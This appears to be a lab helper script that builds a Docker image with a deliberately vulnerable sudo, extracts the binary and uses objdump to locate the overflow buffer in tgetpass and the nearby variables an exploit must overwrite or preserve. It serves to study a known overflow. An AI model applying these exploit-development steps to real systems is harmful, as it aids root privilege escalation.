#!/bin/sh

if command -v docker &> /dev/null; then
	DOCKER=docker
elif command -v podman &> /dev/null; then
	DOCKER=podman
fi

set -e

# Build and copy file.
"$DOCKER" build -t ubuntu:vulnerable-sudo .
"$DOCKER" create --name dummy ubuntu:vulnerable-sudo
"$DOCKER" cp dummy:/usr/local/bin/sudo ./sudo
"$DOCKER" rm -f dummy

# Analyze local sudo.
echo ''
echo '----- ANALYSIS -----'
echo 'Candidate locations of buf that we overflow:'
objdump --disassemble=tgetpass ./sudo | grep '<buf' | awk '{print "0x" $(NF-1)}'
echo 'There should be two values, the higher one is the one we overflow first and we should use that.'

echo ''

echo 'Location of user details (we want to overflow this!):'
objdump -D ./sudo | grep '<user_details>' | awk '{print "0x" $(NF-1)}' | uniq

echo ''

echo 'Location of TGP_ASKPASS (we want to set this to make sure we still get called):'
objdump -D ./sudo | grep '<tgetpass_flags>' | awk '{print "0x" $(NF-1)}' | uniq

echo 'Location of SIGNO (we want to set this to zero to make sure we don''t crash):'
objdump -D ./sudo | grep '<signo>' | awk '{print "0x" $(NF-1)}' | uniq

if [ '1' != "$KEEP" ]; then
	echo ''
	echo 'Deleting the sudo executable. Use KEEP=1 if you want to keep it for analysis.'
	rm ./sudo
fi
